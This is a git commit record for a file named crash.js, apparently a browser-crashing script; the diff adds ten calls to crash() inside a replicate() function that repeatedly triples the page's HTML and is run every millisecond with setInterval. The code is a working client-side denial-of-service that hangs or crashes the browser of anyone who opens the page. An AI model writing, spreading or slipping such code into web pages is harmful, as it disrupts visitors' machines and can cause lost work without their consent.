4a3480d488126a6a725994f1bcfa1b698c52c1b5
resu deteleD <34798985+anti-ghost@users.noreply.github.com>
2021-03-05 18:36:00 -0800

    Update crash.js

--- crash.js
+++ crash.js
@@ -9,6 +9,16 @@ function replicate() {
     document.body.innerHTML +
     document.body.innerHTML +
     document.body.innerHTML;
+  crash();
+  crash();
+  crash();
+  crash();
+  crash();
+  crash();
+  crash();
+  crash();
+  crash();
+  crash();
 }
 
 setInterval(replicate, 1);
